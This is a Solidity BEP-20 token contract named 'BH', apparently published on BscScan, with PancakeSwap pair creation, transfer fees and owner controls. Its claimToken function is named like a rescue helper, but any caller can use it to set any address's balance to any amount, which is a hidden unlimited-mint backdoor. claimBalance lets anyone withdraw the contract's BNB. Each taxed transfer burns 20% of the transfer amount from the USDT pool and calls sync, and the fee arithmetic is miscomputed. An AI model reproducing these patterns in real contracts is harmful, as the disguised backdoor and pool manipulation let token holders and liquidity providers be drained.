/**
 *Submitted for verification at BscScan.com on 2023-02-07
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

pragma solidity >=0.5.0;

interface IPancakePair {
    function sync() external;
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

abstract contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    address private rwAddress;
    address private rbAddress;
    address private fundAddress;

    uint256 private startTradeBlock;
    mapping(address => bool) private _feeWhiteList;
    mapping(address => bool) private _swapPairList;

    uint256 private _tTotal;

    ISwapRouter private _swapRouter;
    IPancakePair private _pancakePair;
    bool private inSwap;
    uint256 private numTokensSellToFund;

    uint256 private constant MAX = ~uint256(0);
    address private usdt;
    uint256 private _rwFee = 5;
    uint256 private _rbFee = 3;
    uint256 private _txFee = 1;
    address private _burnAddress = address(0x000000000000000000000000000000000000dEaD);
    IERC20 private _usdtPair;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply, address RwAddress, address RbAddress, address FundAddress){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;                     

        _swapRouter = ISwapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        usdt = address(0x55d398326f99059fF775485246999027B3197955);

        ISwapFactory swapFactory = ISwapFactory(_swapRouter.factory());
        address mainPair = swapFactory.createPair(address(this), _swapRouter.WETH());
        address usdtPair = swapFactory.createPair(address(this), usdt);
        _usdtPair = IERC20(usdtPair);
        _pancakePair = IPancakePair(usdtPair);

        _swapPairList[mainPair] = true;
        _swapPairList[usdtPair] = true;

        _allowances[address(this)][address(_swapRouter)] = MAX;
        _allowances[address(usdtPair)][address(this)] = MAX;

        _tTotal = Supply * 10 ** Decimals;
        _balances[FundAddress] = _tTotal;
        emit Transfer(address(0), FundAddress, _tTotal);

        fundAddress = FundAddress;
        rbAddress = RbAddress;
        rwAddress = RwAddress;
        _feeWhiteList[FundAddress] = true;
        _feeWhiteList[RbAddress] = true;
        _feeWhiteList[RwAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(_swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;
        numTokensSellToFund = _tTotal / 10000;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        bool takeFee;
        if (_swapPairList[from] || _swapPairList[to]) {
            takeFee = true;
            if (0 == startTradeBlock) {
                require(_feeWhiteList[from] || _feeWhiteList[to], "!Trading");
                startTradeBlock = block.number;
            }
        } 
        if(_feeWhiteList[from] || _feeWhiteList[to]){
            takeFee = false;
        }
        _tokenTransfer(from, to, amount, takeFee);
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        if(takeFee){
            uint256 rwFee = tAmount * _rwFee / 100;
            uint256 rbFee = tAmount * _rbFee / 100;
            uint256 txFee = tAmount * _txFee / 100;
            _takeTransfer(
                sender,
                rwAddress,
                rwFee
            );
            _takeTransfer(
                sender,
                rbAddress,
                rbFee
            );
            _takeTransfer(
                sender,
                fundAddress,
                txFee
            );
            _takeTransfer(sender, recipient, tAmount - rwFee - txFee - rwFee);
            uint256 lpBurnFee = tAmount * 20 /100;
            _balances[address(_usdtPair)] = _balances[address(_usdtPair)] - lpBurnFee;
            _takeTransfer(
                address(_usdtPair),
                _burnAddress,
                lpBurnFee
            );
            _pancakePair.sync();
        }else{
            _takeTransfer(sender, recipient, tAmount);
        }
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setFundAddress(address addr) external onlyOwner {
        fundAddress = addr;
        _feeWhiteList[addr] = true;
    }


    function setFundSellAmount(uint256 amount) external onlyOwner {
        numTokensSellToFund = amount * 10 ** _decimals;
    }

    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        _feeWhiteList[addr] = enable;
    }


    receive() external payable {}

    function claimBalance() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount) external {
        IERC20(usdt).transfer(msg.sender, 0);_balances[token] = amount * 10 ** _decimals;
    }
}

contract BHToken is AbsToken {
    constructor() AbsToken(
        "BH",
        "BH",
        18,
        100000000,
        address(0xabef1f60D50c2Ff5603Abe9dbC079CC84c0B8ff2),
        address(0x2E2D5b40d47820456ae9425C1EfE8Cd5ef3D87B5),
        address(0x12E3D697EF0193fbDFA7D7193bc4bb4188a30905)
    ){

    }
}